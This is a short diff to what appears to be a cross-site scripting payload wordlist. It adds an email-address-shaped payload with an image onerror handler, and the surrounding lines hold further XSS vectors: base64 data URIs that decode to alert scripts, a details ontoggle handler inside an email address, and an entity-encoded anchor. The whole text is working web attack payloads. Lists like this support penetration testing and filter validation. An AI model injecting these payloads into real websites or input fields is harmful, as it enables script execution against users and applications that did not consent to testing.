@@ -1,4 +1,5 @@
 <OBJECT data=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4>
+"<img/src/onerror=alert(0)"@xss.com
 "mitsec<form/><!><details/open/ontoggle=alert(document.domain)>"@gmail.com
 &lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt;
 data:text/html;base64,PGh0bWw+PGhlYWQ+PHNjcmlwdD5hbGVydCgnUGF5bG9hZCcpPC9zY3JpcHQ+PC9oZWFkPjwvaHRtbD4=
